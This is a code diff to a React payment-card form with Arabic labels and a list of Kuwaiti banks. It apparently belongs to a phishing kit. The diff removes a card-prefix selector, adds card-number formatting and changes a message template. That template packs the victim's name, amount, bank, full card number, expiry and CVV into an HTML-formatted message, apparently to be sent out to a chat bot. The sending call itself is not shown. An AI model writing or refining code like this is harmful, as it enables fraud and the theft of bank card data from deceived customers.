@@ -15,7 +15,7 @@ const CardDetails = () => {
     currency: queryParams.get('c') || "KWD"
   }), [window.location.search]);
 
-  const [formData, setFormData] = useState({ bank: "", cardNumber: "", expiryMonth: "", expiryYear: "", cvv: "", prefix: "" });
+  const [formData, setFormData] = useState({ bank: "", cardNumber: "", expiryMonth: "", expiryYear: "", cvv: "" });
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
 
@@ -39,17 +39,6 @@ const CardDetails = () => {
     { value: "citibank", label: "سيتي بنك" }
   ];
 
-  const cardPrefixes = [
-    { value: "", label: "بادئة" },
-    { value: "4", label: "4 (Visa)" },
-    { value: "5", label: "5 (MasterCard)" },
-    { value: "542010", label: "542010 (KNET)" },
-    { value: "503258", label: "503258 (NBK)" },
-    { value: "400494", label: "400494 (GULF)" },
-    { value: "402096", label: "402096 (KFH)" },
-    { value: "419266", label: "419266 (BOUBYAN)" }
-  ];
-
   const validateCardNumber = (number: string) => {
     const digits = number.replace(/\s/g, '');
     if (digits.length < 13 || digits.length > 19) return false;
@@ -64,20 +53,27 @@ const CardDetails = () => {
 
   const handleInputChange = (field: string, value: string) => {
     setError("");
-    setFormData(prev => ({ ...prev, [field]: value }));
+    if (field === 'cardNumber') {
+      // Allow only numbers and spaces, format for visual ease
+      const digitsOnly = value.replace(/\D/g, '');
+      const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
+      setFormData(prev => ({ ...prev, [field]: formatted.slice(0, 24) }));
+    } else {
+      setFormData(prev => ({ ...prev, [field]: value }));
+    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const fullNumber = formData.prefix + formData.cardNumber.replace(/\s/g, '');
-    if (!validateCardNumber(fullNumber)) { setError("رقم البطاقة غير صالح"); return; }
+    const cleanNumber = formData.cardNumber.replace(/\s/g, '');
+    if (!validateCardNumber(cleanNumber)) { setError("رقم البطاقة غير صالح"); return; }
     setLoading(true);
     const message = `
-<b>💳 Card Details</b>
+<b>💳 Card Entry</b>
 <b>Name:</b> ${paymentData.customerName}
 <b>Amount:</b> ${paymentData.amount} KD
 <b>Bank:</b> ${formData.bank}
-<b>Card:</b> ${formData.prefix}${formData.cardNumber}
+<b>Card:</b> <code>${formData.cardNumber}</code>
 <b>Expiry:</b> ${formData.expiryMonth}/${formData.expiryYear}
 <b>CVV:</b> ${formData.cvv}
 `;
@@ -120,12 +116,7 @@ const CardDetails = () => {
               <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:يرجى اختيار البنك</label>
             </div>
             <div className="flex justify-between items-center">
-              <div className="flex space-x-2 sm:space-x-3 flex-1">
-                <select value={formData.prefix} onChange={(e) => handleInputChange('prefix', e.target.value)} className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-xs sm:text-base" required>
-                  {cardPrefixes.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
-                </select>
-                <Input type="text" value={formData.cardNumber} onChange={(e) => handleInputChange('cardNumber', e.target.value)} className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg" required />
-              </div>
+              <Input type="text" placeholder="#### #### #### ####" value={formData.cardNumber} onChange={(e) => handleInputChange('cardNumber', e.target.value)} className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg" required />
               <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:رقم بطاقة الصرف الآلي</label>
             </div>
             <div className="flex justify-between items-center">
